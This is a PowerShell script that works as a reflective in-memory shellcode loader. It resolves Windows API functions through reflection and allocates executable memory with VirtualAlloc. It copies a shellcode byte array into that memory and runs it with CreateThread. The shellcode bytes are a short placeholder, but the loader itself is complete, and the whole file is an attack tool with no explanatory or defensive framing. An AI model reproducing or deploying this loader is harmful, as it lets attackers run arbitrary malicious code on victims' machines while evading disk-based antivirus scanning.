function LookupFunc {
	Param ($moduleName, $functionName)
	
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
	Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

	 $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}}

	 $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }

	return $result;
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
	DefineDynamicAssembly((New-Object
	System.Reflection.AssemblyName('ReflectedDelegate')),
	[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
	DefineDynamicModule('InMemoryModule', $false).
	DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

	$type.DefineConstructor('RtSpecialName, HideBySig, Public',
	[System.Reflection.CallingConventions]::Standard, $func).
	SetImplementationFlags('Runtime, Managed')

	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
	SetImplementationFlags('Runtime, Managed')
	
	return $type.CreateType()
}

# VirtualAlloc, returns address to free memory, Invoke(lpAddress=0, size=0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Shellcode
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x30

# Copy shellcode to allocated memory $lpMem
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.Length)

# Create thread and get the handle, Invoke(threadattributes=0, stacksize=0, shellcode address $lpMem, paramter=0, creationflags=0)
$hThread =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc
kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],
[UInt32], [IntPtr])
([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

# WaitForSingleObject DelegateFunction, Invoke(Handle to thread, wait timer)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc
kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])
([Int]))).Invoke($hThread, 0xFFFFFFFF)